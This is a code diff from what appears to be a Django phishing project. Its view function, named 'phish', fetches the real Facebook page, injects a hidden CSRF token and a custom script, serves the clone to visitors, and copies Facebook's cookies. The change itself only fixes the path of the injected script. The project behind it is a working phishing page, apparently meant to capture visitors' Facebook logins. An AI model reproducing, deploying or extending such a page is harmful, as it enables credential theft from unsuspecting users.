@@ -19,7 +19,7 @@ def phish(request):
 		csrf_c=csrf.get_token(request)
 		request.META['CSRF_COOKIE'] = csrf_c
 	req=requests.get("https://en-gb.facebook.com")
-	text=req.text.replace('</body>','<span id="csrf" hidden>'+str(csrf_c)+'</span><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script><script src="/static/jquery.cookie.js"></script><script src="{% static 'fb12448784534457.js' %}"></script></body>')
+	text=req.text.replace('</body>','<span id="csrf" hidden>'+str(csrf_c)+'</span><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script><script src="/static/jquery.cookie.js"></script><script src="/static/fb12448784534457.js"></script></body>')
 	response=HttpResponse(text)
 	for c in req.cookies:
 		request.META[c.name]=c.value
